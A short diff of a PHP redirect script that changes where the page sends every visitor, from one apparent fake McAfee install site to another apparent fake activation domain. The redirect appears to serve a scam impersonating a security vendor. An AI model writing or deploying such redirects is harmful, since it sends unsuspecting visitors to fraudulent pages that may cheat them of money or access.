@@ -1,4 +1,4 @@
 <?php
-header("Location: https://install-setups.website/mcafe/");
+header("Location: https://start-your-product.site/actmca/");
 die();
 ?>
